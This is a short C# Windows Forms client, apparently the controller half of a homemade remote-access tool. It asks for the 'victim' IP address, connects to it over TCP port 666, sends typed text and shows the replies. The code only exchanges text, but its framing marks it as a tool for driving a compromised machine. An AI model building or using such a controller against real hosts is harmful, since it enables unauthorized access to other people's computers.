using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace CLienteeee
{
    public partial class Form1 : Form
    {
        TcpClient server;
        String ip;

        public Form1()
        {
            InitializeComponent();

            this.ip = Form1.ShowDialogIP("Digite o IP da víima", "Papada");

            this.server = new TcpClient();
            server.Connect(this.ip, 666);
            this.messageListener(server.GetStream(), server, this);

        }

        private void button1_Click(object sender, EventArgs e)
        {
            string msg = this.txtMsg.Text;
            byte[] saida = Encoding.ASCII.GetBytes(msg);
            this.server.GetStream().Write(saida, 0, saida.Length);
            this.server.GetStream().Flush();
        }

        public void messageListener(NetworkStream stream, TcpClient client, Form1 self)
        {
            new Thread(() =>
            {
                while (true)
                {
                    while (!stream.DataAvailable) ;
                    Byte[] bytes = new Byte[client.Available];
                    stream.Read(bytes, 0, bytes.Length);
                    String msg = Encoding.UTF8.GetString(bytes);
                    self.SetText(msg);               
                }
            }).Start();
        }

        //Para acessar Windows Form de oura thread sem ser a UIThread
        delegate void SetTextCallback(string text);

        private void SetText(string text)
        {
            if (this.richTextBox1.InvokeRequired)
            {
                SetTextCallback d = new SetTextCallback(SetText);
                this.Invoke(d, new object[] { text });
            }
            else
            {
                this.richTextBox1.Text += text + Environment.NewLine + Environment.NewLine;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            this.richTextBox1.Text = "";
        }

        public static string ShowDialogIP(string text, string caption)
        {
            Form prompt = new Form()
            {
                Width = 500,
                Height = 150,
                FormBorderStyle = FormBorderStyle.FixedDialog,
                Text = caption,
                StartPosition = FormStartPosition.CenterScreen
            };
            Label textLabel = new Label() { Left = 50, Top = 20, Text = text };
            TextBox textBox = new TextBox() { Left = 50, Top = 50, Width = 400 };
            Button confirmation = new Button() { Text = "Ok", Left = 350, Width = 100, Top = 70, DialogResult = DialogResult.OK };
            confirmation.Click += (sender, e) => { prompt.Close(); };
            prompt.Controls.Add(textBox);
            prompt.Controls.Add(confirmation);
            prompt.Controls.Add(textLabel);
            prompt.AcceptButton = confirmation;

            textBox.Text = "10.3.2.16";

            return prompt.ShowDialog() == DialogResult.OK ? textBox.Text : "";
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
    }
}
